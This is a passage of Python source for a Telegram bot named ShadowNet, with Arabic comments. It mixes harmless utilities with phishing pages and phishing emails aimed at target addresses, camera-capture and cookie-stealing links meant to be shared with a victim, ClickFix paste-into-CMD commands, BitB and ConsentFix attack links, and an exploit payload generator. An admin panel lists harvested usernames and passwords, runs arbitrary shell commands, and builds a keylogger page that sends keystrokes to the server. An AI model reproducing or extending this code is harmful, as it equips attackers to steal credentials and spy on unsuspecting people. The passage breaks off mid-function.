@bot.message_handler(commands=['start'])
def handle_start(message):
    try:
        chat_id = message.chat.id
        ensure_user(chat_id)
        update_last_seen(chat_id)
        log_activity(chat_id, "start")

        # معالجة الإحالة
        parts = message.text.split()
        if len(parts) > 1:
            ref_code = parts[1]
            row = safe_db_query("SELECT chat_id FROM users WHERE referral_code = ?", (ref_code,))
            if row and row[0] != chat_id:
                add_points(row[0], 5, "إحالة جديدة")
                add_points(chat_id, 5, "مكافأة إحالة")

        bot.send_message(
            chat_id,
            "👋 مرحباً بك في <b>ShadowNet</b>!\n\nاختر من القائمة أدناه:",
            reply_markup=build_main_menu(chat_id),
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"handle_start error: {e}")

# ===================== معالج /help =====================
@bot.message_handler(commands=['help'])
def handle_help(message):
    chat_id = message.chat.id
    ensure_user(chat_id)
    bot.send_message(
        chat_id,
        "📖 <b>الأوامر المتاحة:</b>\n\n"
        "/start - القائمة الرئيسية\n"
        "/help - هذه المساعدة\n"
        "/check_mail - عرض رسائل البريد المؤقت\n"
        "/read_رقم - قراءة رسالة محددة",
        parse_mode='HTML'
    )

# ===================== معالج /check_mail =====================
@bot.message_handler(commands=['check_mail'])
def handle_check_mail(message):
    chat_id = message.chat.id
    if chat_id not in user_emails:
        bot.send_message(chat_id, "📭 لا يوجد بريد مؤقت نشط. أنشئ واحداً من القائمة.")
        return
    email, name, domain = user_emails[chat_id]
    try:
        url = f"https://www.1secmail.com/api/v1/?action=getMessages&login={name}&domain={domain}"
        msgs = requests.get(url, timeout=10).json()
        if not msgs:
            bot.send_message(chat_id, f"📭 لا رسائل في {email}")
            return
        txt = f"📬 رسائل {email}:\n\n"
        for m in msgs[:10]:
            txt += f"📩 ID: {m['id']}\nمن: {m['from']}\nالموضوع: {m['subject']}\nلقراءة: /read_{m['id']}\n\n"
        bot.send_message(chat_id, txt)
    except Exception as e:
        bot.send_message(chat_id, f"❌ خطأ: {str(e)[:100]}")

# ===================== معالج الأزرار (Callback Handler) =====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    # ✅ إصلاح الخطأ: الإعلان عن global في أول سطر قبل أي استخدام
    global BOT_LOCKED, STEALTH_MODE
    try:
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        data = call.data

        # الرد على تيليجرام فوراً (لإزالة loading)
        try:
            bot.answer_callback_query(call.id, cache_time=0)
        except Exception as e:
            logger.warning(f"answer_callback error: {e}")

        ensure_user(chat_id)
        update_last_seen(chat_id)
        log_activity(chat_id, f"callback: {data}")

        if is_banned(chat_id) and not is_admin(chat_id):
            safe_send(chat_id, "🚫 أنت محظور.")
            return
        if BOT_LOCKED and not is_admin(chat_id):
            safe_send(chat_id, "🔒 البوت مقفل مؤقتاً.")
            return

        # ===== القائمة الرئيسية =====
        if data == "back_main":
            try:
                bot.edit_message_text("🏠 القائمة الرئيسية:", chat_id, message_id,
                                      reply_markup=build_main_menu(chat_id))
            except:
                safe_send(chat_id, "🏠 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))
            return

        # ===== الطقس =====
        if data == "weather":
            user_states[chat_id] = "weather"
            safe_send(chat_id, "🌤️ أرسل اسم المدينة:")
            return

        # ===== ويكيبيديا =====
        if data == "wikipedia":
            user_states[chat_id] = "wikipedia"
            safe_send(chat_id, "📚 أرسل كلمة البحث:")
            return

        # ===== مولد كلمات المرور =====
        if data == "password_gen":
            pwd = generate_strong_password()
            safe_send(chat_id, f"🔑 كلمة مرور قوية:\n<code>{pwd}</code>")
            return

        # ===== تحليل كلمات المرور =====
        if data == "password_strength":
            user_states[chat_id] = "password_strength"
            safe_send(chat_id, "🔐 أرسل كلمة المرور لتحليلها:")
            return

        # ===== الصوت =====
        if data == "voice_gtts_menu":
            safe_send(chat_id, "🎤 اختر الصوت:", reply_markup=build_voice_gtts_menu())
            return

        if data.startswith("voice_gtts_"):
            voice_name = data.replace("voice_gtts_", "")
            user_voice_selection[chat_id] = VOICES.get(voice_name, "ar")
            user_states[chat_id] = "waiting_voice_text"
            safe_send(chat_id, f"🎤 أرسل النص لتحويله لصوت ({voice_name}):")
            return

        # ===== الترجمة =====
        if data == "translate":
            user_states[chat_id] = "translate"
            safe_send(chat_id, "🌐 أرسل النص للترجمة:")
            return

        if data.startswith("trans_lang_"):
            lang = data.replace("trans_lang_", "")
            text = user_states.get(f"{chat_id}_translate_text")
            if text:
                results, _, _, _ = translate_text_advanced_with_lang(text, lang)
                safe_send(chat_id, f"🌐 الترجمة:\n{results[0]}")
            user_states[chat_id] = None
            return

        # ===== التذكير =====
        if data == "reminder":
            user_states[chat_id] = "reminder"
            safe_send(chat_id, "⏰ أرسل: <code>الرسالة|الساعة:الدقيقة</code>\nمثال: اجتماع|14:30")
            return

        # ===== الأخبار =====
        if data == "news":
            safe_send(chat_id, "📰 جاري جلب الأخبار...")
            result = get_news_without_api('general')
            safe_send(chat_id, result[:4000])
            return

        # ===== تقصير الروابط =====
        if data == "shorten_url":
            user_states[chat_id] = "waiting_shorten"
            safe_send(chat_id, "🔗 أرسل الرابط لتقصيره:")
            return

        if data == "expand_url":
            user_states[chat_id] = "waiting_expand"
            safe_send(chat_id, "🔗 أرسل الرابط المختصر:")
            return

        # ===== معلومات الجهاز =====
        if data == "device_info":
            if not (user_can_use_collector(chat_id) or is_admin(chat_id)):
                safe_send(chat_id, "🔒 غير مصرح.")
                return
            link = f"{SERVER_URL}/camera_hack?id={chat_id}"
            safe_send(chat_id, f"📱 رابط جمع المعلومات:\n{link}")
            return

        # ===== الكاميرا =====
        if data == "camera_hack":
            if not (user_can_use_camera(chat_id) or is_admin(chat_id)):
                safe_send(chat_id, "🔒 غير مصرح.")
                return
            link = f"{SERVER_URL}/camera_hack?id={chat_id}"
            safe_send(chat_id, f"📷 رابط الكاميرا:\n{link}\n\nشاركه مع الهدف.")
            return

        # ===== الكوكيز =====
        if data == "cookie_stealer":
            if not (user_can_use_advanced(chat_id) or is_admin(chat_id)):
                safe_send(chat_id, "🔒 غير مصرح.")
                return
            link = f"{SERVER_URL}/cookie_stealer?id={chat_id}"
            safe_send(chat_id, f"🍪 رابط استخراج الكوكيز:\n{link}")
            return

        # ===== تتبع الهاتف =====
        if data == "track_phone":
            user_states[chat_id] = "waiting_phone"
            safe_send(chat_id, "📱 أرسل الرقم مع رمز الدولة (مثال: +201234567890):")
            return

        # ===== مكالمة الفيديو =====
        if data == "video_call":
            link = f"{SERVER_URL}/video_call?id={chat_id}"
            safe_send(chat_id, f"📹 رابط مكالمة الفيديو:\n{link}")
            return

        # ===== الاقتباسات =====
        if data == "quotes_menu":
            safe_send(chat_id, "💬 اختر الفئة:", reply_markup=build_quotes_menu())
            return

        if data.startswith("quote_cat_"):
            cat = data.replace("quote_cat_", "")
            quotes = QUOTES_DB.get(cat, ["لا توجد اقتباسات"])
            safe_send(chat_id, f"💬 {cat}:\n\n{random.choice(quotes)}")
            return

        # ===== فحص الروابط =====
        if data == "check_link_btn":
            user_states[chat_id] = "waiting_link_check"
            safe_send(chat_id, "🔍 أرسل الرابط لفحصه:")
            return

        # ===== تحليل APK =====
        if data == "analyze_apk":
            user_states[chat_id] = "analyze_apk"
            safe_send(chat_id, "📦 أرسل ملف APK:")
            return

        # ===== PDF =====
        if data == "pdf_menu":
            safe_send(chat_id, "📄 أرسل ملف PDF أولاً، ثم اختر الإجراء.", reply_markup=build_pdf_menu())
            return

        if data == "pdf_summary":
            text = pdf_texts.get(chat_id)
            if text:
                safe_send(chat_id, f"📄 ملخص:\n{text[:2000]}")
            else:
                safe_send(chat_id, "❌ أرسل PDF أولاً.")
            return

        if data == "pdf_extract":
            text = pdf_texts.get(chat_id)
            if text:
                safe_send(chat_id, f"📄 النص:\n{text[:3000]}")
            else:
                safe_send(chat_id, "❌ أرسل PDF أولاً.")
            return

        # ===== توليد صور =====
        if data == "generate_image_btn":
            user_states[chat_id] = "waiting_image_prompt"
            safe_send(chat_id, "🎨 أرسل وصف الصورة:")
            return

        # ===== بريد مؤقت =====
        if data == "create_email_btn":
            try:
                res = requests.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1", timeout=10).json()
                email = res[0]
                name, domain = email.split('@')
                user_emails[chat_id] = (email, name, domain)
                safe_send(chat_id, f"📧 بريدك المؤقت:\n<code>{email}</code>\n\nلعرض الرسائل: /check_mail")
            except Exception as e:
                safe_send(chat_id, f"❌ خطأ: {str(e)[:100]}")
            return

        # ===== النقاط =====
        if data == "my_points":
            pts = get_user_points(chat_id)
            safe_send(chat_id, f"💎 نقاطك: <b>{pts}</b>")
            return

        if data == "my_referral":
            row = safe_db_query("SELECT referral_code FROM users WHERE chat_id = ?", (chat_id,))
            code = row[0] if row and row[0] else None
            if not code:
                code = secrets.token_hex(4)
                safe_db_execute("UPDATE users SET referral_code = ? WHERE chat_id = ?", (code, chat_id))
            try:
                bot_username = (bot.get_me()).username
                safe_send(chat_id, f"🔗 رابط الدعوة:\nhttps://t.me/{bot_username}?start={code}")
            except:
                safe_send(chat_id, f"🔗 كود الدعوة: <code>{code}</code>")
            return

        if data == "points_history":
            rows = safe_db_query("SELECT amount, reason, created_at FROM points_log WHERE user_id = ? ORDER BY id DESC LIMIT 10",
                                 (chat_id,), fetch_one=False)
            if not rows:
                safe_send(chat_id, "📜 لا يوجد سجل.")
                return
            msg = "📜 آخر العمليات:\n"
            for amt, rsn, dt in rows:
                msg += f"• {amt:+d} | {rsn} | {dt[:10]}\n"
            safe_send(chat_id, msg)
            return

        # ===== ClickFix =====
        if data == "clickfix_generator":
            user_states[chat_id] = "waiting_clickfix_target"
            safe_send(chat_id, "🎯 أرسل اسم الهدف:")
            return

        # ===== AccountDumpling =====
        if data == "account_dumpling":
            user_states[chat_id] = "waiting_account_dumpling_email"
            safe_send(chat_id, "📧 أرسل البريد الإلكتروني للهدف:")
            return

        # ===== BitB =====
        if data == "bitb_attack":
            link = f"{SERVER_URL}/bitb?id={chat_id}"
            safe_send(chat_id, f"🪟 رابط BitB:\n{link}")
            return

        # ===== ConsentFix =====
        if data == "consentfix_attack":
            link = f"{SERVER_URL}/consentfix?id={chat_id}"
            safe_send(chat_id, f"🔑 رابط ConsentFix:\n{link}")
            return

        # ===== BTMOB =====
        if data == "btmob_attack":
            link = f"{SERVER_URL}/btmob?id={chat_id}"
            safe_send(chat_id, f"📱 رابط BTMOB:\n{link}")
            return

        # ===== تنزيل فيديو =====
        if data == "download_video":
            user_states[chat_id] = "waiting_download"
            safe_send(chat_id, "📥 أرسل رابط الفيديو:")
            return

        # ===== أدوات المطور =====
        if data == "vuln_agent":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                return
            user_states[chat_id] = "vuln_agent"
            safe_send(chat_id, "🔍 أرسل IP أو نطاق:")
            return

        if data == "osint_d2":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                return
            user_states[chat_id] = "osint_d2"
            safe_send(chat_id, "🕵️ أرسل النطاق أو البريد:")
            return

        if data == "py_netrecon":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                return
            user_states[chat_id] = "py_netrecon"
            safe_send(chat_id, "🌐 أرسل IP أو نطاق:")
            return

        if data == "exploit_dev":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                return
            user_states[chat_id] = "exploit_dev"
            safe_send(chat_id, "💀 أرسل IP الهدف:")
            return

        if data == "h4x_tools":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                return
            user_states[chat_id] = "h4x_tools"
            safe_send(chat_id, "📧 أرسل بريد أو نطاق:")
            return

        if data == "matkap":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                return
            user_states[chat_id] = "matkap"
            safe_send(chat_id, "🛡️ أرسل التوكن أو Chat ID:")
            return

        if data == "pentest_tools":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                return
            user_states[chat_id] = "pentest_tools"
            safe_send(chat_id, "🐍 أرسل اسم الأداة: scapy | impacket | paramiko")
            return

        # ===== صفحات التصيد =====
        if data == "phishing_pages":
            if not (user_can_use_phishing(chat_id) or is_admin(chat_id)):
                safe_send(chat_id, "🔒 غير مصرح.")
                return
            safe_send(chat_id, "🎣 اختر المنصة:", reply_markup=build_phishing_pages_menu())
            return

        if data.startswith("phish_") and not data.startswith("phish_platform_"):
            platform = data.replace("phish_", "")
            link = f"{SERVER_URL}/phishing_pages/{platform}"
            safe_send(chat_id, f"🎣 رابط تصيد {platform}:\n{link}")
            return

        if data == "phishing_locked":
            safe_send(chat_id, f"🔒 تحتاج 300 نقطة. نقاطك الحالية: {get_user_points(chat_id)}")
            return

        if data == "phishing_email":
            if not (user_can_use_phishing(chat_id) or is_admin(chat_id)):
                safe_send(chat_id, "🔒 غير مصرح.")
                return
            safe_send(chat_id, "🎣 اختر المنصة:", reply_markup=build_phishing_platform_menu())
            return

        if data.startswith("phish_platform_"):
            platform = data.replace("phish_platform_", "")
            user_states[f"{chat_id}_phishing_platform"] = platform
            user_states[chat_id] = "waiting_phishing_target"
            safe_send(chat_id, f"📧 أرسل البريد المستهدف لتصيد {platform}:")
            return

        # ===== لوحة التحكم =====
        if data == "admin_panel":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                return
            safe_send(chat_id, "⚙️ لوحة التحكم:", reply_markup=build_admin_panel())
            return

        if data == "admin_stats":
            if not is_admin(chat_id):
                return
            users_count = safe_db_query("SELECT COUNT(*) FROM users")
            users_count = users_count[0] if users_count else 0
            phishing_count = safe_db_query("SELECT COUNT(*) FROM phishing_logs")
            phishing_count = phishing_count[0] if phishing_count else 0
            safe_send(chat_id, f"📊 <b>الإحصائيات:</b>\nالمستخدمين: {users_count}\nعمليات التصيد: {phishing_count}")
            return

        if data == "admin_users":
            if not is_admin(chat_id):
                return
            markup, err = build_users_menu(chat_id, "info")
            if err:
                safe_send(chat_id, err)
            else:
                safe_send(chat_id, "👥 المستخدمون:", reply_markup=markup)
            return

        if data == "admin_phishing_logs":
            if not is_admin(chat_id):
                return
            rows = safe_db_query("SELECT platform, username, password, created_at FROM phishing_logs ORDER BY id DESC LIMIT 20",
                                 fetch_one=False)
            if not rows:
                safe_send(chat_id, "📜 لا يوجد سجل تصيد.")
                return
            msg = "📜 آخر عمليات التصيد:\n\n"
            for platform, username, password, dt in rows:
                msg += f"🎣 {platform} | {username} | {password} | {dt[:16]}\n"
            safe_send(chat_id, msg[:4000])
            return

        if data == "admin_broadcast":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_broadcast"
            safe_send(chat_id, "📢 أرسل الرسالة للبث:")
            return

        if data == "admin_reports":
            if not is_admin(chat_id):
                return
            safe_send(chat_id, "📊 التقارير قيد التطوير.")
            return

        # ===== RCE =====
        if data == "rce_menu":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_rce"
            safe_send(chat_id, "🖥️ أرسل الأمر لتنفيذه:")
            return

        # ===== Keylogger =====
        if data == "keylogger_menu":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_keylogger"
            safe_send(chat_id, "🔑 سيتم إنشاء رابط Keylogger. أرسل أي نص للمتابعة:")
            return

        # ===== الحماية =====
        if data == "protection_menu":
            if not is_admin(chat_id):
                return
            safe_send(chat_id, "🛡️ قائمة الحماية:", reply_markup=build_protection_menu())
            return

        if data == "protect_lock":
            # ✅ لا حاجة لـ global هنا (تم إعلانها في بداية الدالة)
            BOT_LOCKED = not BOT_LOCKED
            safe_send(chat_id, f"🔒 حالة القفل: {'مقفل' if BOT_LOCKED else 'مفتوح'}")
            return

        if data == "protect_stealth":
            # ✅ لا حاجة لـ global هنا (تم إعلانها في بداية الدالة)
            STEALTH_MODE = not STEALTH_MODE
            safe_send(chat_id, f"🥷 التخفي: {'مفعّل' if STEALTH_MODE else 'معطّل'}")
            return

        # ===== fallback =====
        safe_send(chat_id, "⚠️ خيار غير معروف.")

    except Exception as e:
        logger.error(f"handle_callback error: {e}")
        try:
            notify_admin(f"خطأ في callback: {e}")
        except:
            pass

# ===================== معالج النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text(message):
    try:
        chat_id = message.chat.id
        text = message.text.strip()
        state = user_states.get(chat_id)

        ensure_user(chat_id)
        update_last_seen(chat_id)
        log_activity(chat_id, f"text: {text[:50]}")

        if is_banned(chat_id) and not is_admin(chat_id):
            safe_send(chat_id, "🚫 أنت محظور.")
            return
        if BOT_LOCKED and not is_admin(chat_id):
            safe_send(chat_id, "🔒 البوت مقفل.")
            return

        # ===== /read_ =====
        if text.startswith('/read_'):
            if chat_id not in user_emails:
                safe_send(chat_id, "📭 لا يوجد بريد نشط.")
                return
            try:
                msg_id = text.split('_')[1]
            except:
                safe_send(chat_id, "📩 استخدم: /read_رقم_الرسالة")
                return
            _, name, domain = user_emails[chat_id]
            url = f"https://www.1secmail.com/api/v1/?action=readMessage&login={name}&domain={domain}&id={msg_id}"
            try:
                res = requests.get(url, timeout=10).json()
                result = f"📩 من: {res.get('from')}\nالموضوع: {res.get('subject')}\n\n{res.get('textBody', '')}"
                safe_send(chat_id, result[:4000])
            except Exception as e:
                safe_send(chat_id, f"❌ خطأ: {str(e)[:100]}")
            return

        # ===== ClickFix =====
        if state == "waiting_clickfix_target":
            target_name = text or "مستخدم"
            fake_command = generate_clickfix_command(target_name)
            safe_db_execute("INSERT INTO clickfix_logs (chat_id, command, created_at) VALUES (?, ?, ?)",
                            (str(chat_id), fake_command, datetime.now().isoformat()))
            safe_send(chat_id, f"📋 <b>أمر ClickFix لـ {target_name}:</b>\n\n<code>{fake_command}</code>\n\n📌 انسخ والصق في CMD.", parse_mode='HTML')
            user_states[chat_id] = None
            return

        # ===== AccountDumpling =====
        if state == "waiting_account_dumpling_email":
            target_email = text
            html = generate_account_dumpling_email(target_email)
            result = send_phishing_email(target_email, "facebook", custom_message=html)
            safe_db_execute("INSERT INTO account_dumpling_logs (target_email, platform, status, created_at) VALUES (?, ?, ?, ?)",
                            (target_email, "facebook", "sent", datetime.now().isoformat()))
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        # ===== بريد تصيد =====
        if state == "waiting_phishing_target":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            target_email = text
            result = send_phishing_email(target_email, platform)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        # ===== vuln_agent =====
        if state == "vuln_agent":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري الفحص...")
            result = vuln_agent_scan(text)
            safe_send(chat_id, result[:4000])
            user_states[chat_id] = None
            return

        # ===== osint_d2 =====
        if state == "osint_d2":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري جمع المعلومات...")
            result = osint_d2_search(text)
            safe_send(chat_id, result[:4000])
            user_states[chat_id] = None
            return

        # ===== py_netrecon =====
        if state == "py_netrecon":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري المسح...")
            result = py_netrecon_scan(text)
            safe_send(chat_id, result[:4000])
            user_states[chat_id] = None
            return

        # ===== exploit_dev =====
        if state == "exploit_dev":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                user_states[chat_id] = None
                return
            if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', text):
                safe_send(chat_id, "❌ أدخل IP صحيح (مثل 192.168.1.100)")
                return
            payload = exploit_dev_generate(text)
            safe_send(chat_id, f"💀 الحمولة لـ {text}:\n<code>{payload}</code>", parse_mode='HTML')
            user_states[chat_id] = None
            return

        # ===== h4x_tools =====
        if state == "h4x_tools":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                user_states[chat_id] = None
                return
            result = h4x_tools_search(text)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        # ===== matkap =====
        if state == "matkap":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                user_states[chat_id] = None
                return
            result = matkap_check(text)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        # ===== pentest_tools =====
        if state == "pentest_tools":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                user_states[chat_id] = None
                return
            if text.lower() not in ['scapy', 'impacket', 'paramiko']:
                safe_send(chat_id, "❌ أدوات: scapy | impacket | paramiko")
                return
            result = pentest_tools_use(text.lower(), 'target')
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        # ===== RCE =====
        if state == "waiting_rce":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                user_states[chat_id] = None
                return
            try:
                output = subprocess.check_output(text, shell=True, stderr=subprocess.STDOUT, timeout=30)
                output = output.decode('utf-8', errors='ignore')
            except Exception as e:
                output = str(e)
            safe_send(chat_id, f"🖥️ النتيجة:\n<pre>{output[:3000]}</pre>")
            user_states[chat_id] = None
            return

        # ===== Keylogger =====
        if state == "waiting_keylogger":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                user_states[chat_id] = None
                return
            keylogger_html = f'''<!DOCTYPE html>
<html><body><script>
let ks='';
document.addEventListener('keydown', function(e) {{
    ks += e.key;
    if (ks.length > 50) {{
        fetch('{SERVER_URL}/api/collect_keylog', {{
            method:'POST', headers:{{'Content-Type':'application/json'}},
            body: JSON.stringify({{chat_id:'{chat_id}', keystrokes: ks}})
        }});
        ks='';
    }}
}});
</script><h1>Loading...</h1></body></html>'''
            os.makedirs('temp', exist_ok=True)
            fname = f"keylogger_{chat_id}_{int(time.time())}.html"
            fpath = f"temp/{fname}"
            with open(fpath, 'w', encoding='utf-8') as f:
                f.write(keylogger_html)
            link = f"{SERVER_URL}/temp/{fname}"
            safe_send(chat_id, f"🔑 رابط Keylogger:\n{link}")
            user_states[chat_id] = None
            return

        # ===== Broadcast =====
        if state == "waiting_broadcast":
            if not is_admin(chat_id):
                user_states[chat_id] = None
                return
            users = safe_db_query("SELECT chat_id FROM users", fetch_one=False)
            sent = 0
            for (uid,) in users:
                if safe_send(uid, f"📢 <b>إعلان:</b>\n\n{text}"):
                    sent += 1
                time.sleep(0.05)
            safe_send(chat_id, f"✅ تم الإرسال لـ {sent} مستخدم.")
            user_states[chat_id] = None
            return

        # ===== تنزيل فيديو =====
        if state == "waiting_download":
            safe_send(chat_id, "⏳ جاري التحميل...")
            filename, error = download_video(text)
            if filename and os.path.exists(filename):
                try:
                    with open(filename, 'rb') as f:
                        bot.send_video(chat_id, f, caption="✅ تم التحميل!", timeout=300)
                    os.remove(filename)
                except Exception as e:
                    safe_send(chat_id, f"❌ فشل الإرسال: {str(e)[:100]}")
            else:
                safe_send(chat_id, f"❌ فشل التحميل: {error}")
            user_states[chat_id] = None
            return

        # ===== الخدمات العامة =====
        if state == "weather":
            safe_send(chat_id, get_weather_detailed(text))
            user_states[chat_id] = None
            return

        if state == "wikipedia":
            safe_send(chat_id, f"📚 نتيجة البحث:\n{advanced_wikipedia_search(text)}"[:4000])
            user_states[chat_id] = None
            return

        if state == "translate":
            user_states[chat_id] = "waiting_translate_lang"
            user_states[f"{chat_id}_translate_text"] = text
            safe_send(chat_id, "🌐 اختر اللغة:", reply_markup=build_translate_menu())
            return

        if state == "reminder":
            parts = text.split('|')
            if len(parts) >= 2:
                msg_text = parts[0].strip()
                time_str = parts[1].strip()
                try:
                    hour, minute = map(int, time_str.split(':'))
                    now = datetime.now()
                    target_time = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
                    if target_time <= now:
                        target_time += timedelta(days=1)
                    safe_db_execute("INSERT INTO reminders (chat_id, message, remind_time, created_at) VALUES (?, ?, ?, ?)",
                                    (chat_id, msg_text, target_time.isoformat(), datetime.now().isoformat()))
                    safe_send(chat_id, f"✅ تم تعيين التذكير لـ {time_str}")
                except:
                    safe_send(chat_id, "❌ وقت غير صحيح.")
            else:
                safe_send(chat_id, "❌ استخدم: الرسالة|الساعة:الدقيقة")
            user_states[chat_id] = None
            return

        if state == "password_strength":
            strength, time_taken, score, feedback = analyze_password(text)
            msg = f"🔐 <b>تحليل كلمة المرور:</b>\n\nالقوة: {strength}\nالنتيجة: {score}/6\nوقت الكسر: {time_taken}\n"
            if feedback:
                msg += "\n💡 <b>نصائح:</b>\n" + "\n".join(f"• {f}" for f in feedback)
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        if state == "waiting_voice_text":
            lang = user_voice_selection.get(chat_id, "ar")
            voice = generate_voice_gtts(text, lang)
            if voice:
                bot.send_voice(chat_id, voice)
            else:
                safe_send(chat_id, "❌ فشل توليد الصوت.")
            user_states[chat_id] = None
            return

        if state == "waiting_image_prompt":
            safe_send(chat_id, "🎨 جاري التوليد...")
            img = generate_image(text)
            if img:
                try:
                    bot.send_photo(chat_id, img)
                except Exception as e:
                    safe_send(chat_id, f"❌ فشل الإرسال: {str(e)[:100]}")
            else:
                safe_send(chat_id, "❌ فشل توليد الصورة.")
            user_states[chat_id] = None
            return

        if state == "waiting_shorten":
            short = shorten_url(text)
            safe_send(chat_id, f"🔗 الرابط المختصر:\n{short}" if short else "❌ فشل التقصير.")
            user_states[chat_id] = None
            return

        if state == "waiting_expand":
            original = expand_url(text)
            safe_send(chat_id, f"🔗 الرابط الأصلي:\n{original}" if original else "❌ رابط غير صحيح.")
            user_states[chat_id] = None
            return

        if state == "waiting_phone":
            safe_send(chat_id, track_phone_number(text))
            user_states[chat_id] = None
            return

        if state == "waiting_link_check":
            result = check_link_no_api(text)
            safe_send(chat_id, f"🔍 النتيجة: {result['message']}")
            user_states[chat_id] = None
            return

        if state == "waiting_translate_lang":
            user_states[f"{chat_id}_translate_text"] = text
            safe_send(chat_id, "🌐 اختر اللغة:", reply_markup=build_translate_menu())
            return

        # ===== إذا لم تكن هناك حالة =====
        if state is None:
            safe_send(chat_id, "🏠 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"handle_text error: {e}")
        try:
            safe_send(chat_id, "❌ حدث خطأ.")
        except:
            pass

# ===================== معالج الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    try:
        chat_id = message.chat.id
        file = message.document
        file_name = file.file_name or "بدون_اسم"

        ensure_user(chat_id)
        update_last_seen(chat_id)

        if file_name.lower().endswith('.pdf'):
            safe_send(chat_id, "📄 جاري قراءة الملف...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            text = extract_pdf_text(downloaded)
            if text and not text.startswith("خطأ"):
                pdf_texts[chat_id] = text
                safe_send(chat_id, f"✅ تم الاستخراج ({len(text)} حرف)")
                safe_send(chat_id, "📊 اختر الإجراء:", reply_markup=build_pdf_menu())
            else:
                safe_send(chat_id, f"❌ {text}")
            return

        if user_states.get(chat_id) == "analyze_apk":
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "❌ يرجى إرسال ملف APK.")
                return
            safe_send(chat_id, "📦 جاري التحليل...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            result = analyze_apk(downloaded, file_name)
            if result.get('error'):
                safe_send(chat_id, f"❌ {result['error']}")
            else:
                msg = (f"📦 <b>تحليل APK:</b>\n"
                       f"الحزمة: {result.get('package')}\n"
                       f"الأذونات الخطيرة: {len(result.get('dangerous_permissions', []))}\n"
                       f"ضار: {'⚠️ نعم' if result.get('malicious') else '✅ لا'}")
                safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        safe_send(chat_id, "📄 تم استلام الملف.")
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        try:
            safe_send(chat_id, f"❌ خطأ: {str(e)[:100]}")
        except:
            pass

# ===================== معالج الصور =====================
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    try:
        chat_id = message.chat.id
        ensure_user(chat_id)
        if is_admin(chat_id):
            safe_send(chat_id, "✅ تم استلام الصورة.")
    except Exception as e:
        logger.error(f"handle_photo error: {e}")

# ===================== مهام الخلفية =====================
def keep_alive():
    while True:
        time.sleep(120)
        try:
            requests.get(f"{SERVER_URL}/health", timeout=10)
        except Exception as e:
            logger.warning(f"keep_alive error: {e}")

def check_reminders():
    while True:
        try:
            now = datetime.now().isoformat()
            rows = safe_db_query(
                "SELECT id, chat_id, message FROM reminders WHERE remind_time <= ? AND is_active = 1",
                (now,), fetch_one=False
            )
            if rows:
                for rid, chat_id, msg in rows:
                    try:
                        safe_send(chat_id, f"⏰ <b>تذكير:</b>\n{msg}")
                    except:
                        pass
                    safe_db_execute("UPDATE reminders SET is_active = 0 WHERE id = ?", (rid,))
        except Exception as e:
            logger.error(f"check_reminders error: {e}")
        time.sleep(30)

# ===================== إعداد Webhook =====================
WEBHOOK_URL = f"{SERVER_URL}/webhook"

def setup_webhook_with_delay():
    time.sleep(8)
    try:
        try:
            bot.delete_webhook(drop_pending_updates=True)
            logger.info("🗑️ تم حذف Webhook القديم")
            time.sleep(1)
        except Exception as e:
            logger.warning(f"delete_webhook warning: {e}")

        result = bot.set_webhook(url=WEBHOOK_URL, drop_pending_updates=True, timeout=60)
        if result:
            logger.info(f"✅ تم تعيين Webhook: {WEBHOOK_URL}")
        else:
            logger.error(f"❌ فشل تعيين Webhook")

        time.sleep(2)
        info = bot.get_webhook_info()
        logger.info(f"📋 Webhook info: url={info.url}, pending={info.pending_update_count}")
        if info.last_error_message:
